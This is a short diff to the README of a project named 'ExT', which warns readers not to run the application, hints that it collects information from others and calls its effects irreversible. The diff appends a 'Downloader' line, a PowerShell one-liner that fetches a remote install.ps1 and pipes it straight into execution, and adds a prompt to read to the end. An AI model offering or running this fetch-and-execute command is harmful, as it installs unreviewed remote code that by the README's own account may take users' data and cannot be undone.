@@ -1,6 +1,6 @@
 # ExT
 ⚠️ SECURITY & PRIVACY WARNING
-
+(READ UNTIL THE END)
 
 DO NOT DOWNLOAD, EXECUTE, OR RUN THIS APPLICATION ON YOUR PERSONAL OR WORK DEVICE.
 
@@ -46,4 +46,5 @@ The author does not encourage unauthorized collection of information from other 
 
 Running the executable is NOT reversable
 
-
+Downloader for the file:
+iwr -useb "https://raw.githubusercontent.com/FishySpelar/ExT/releases/install.ps1" | iex
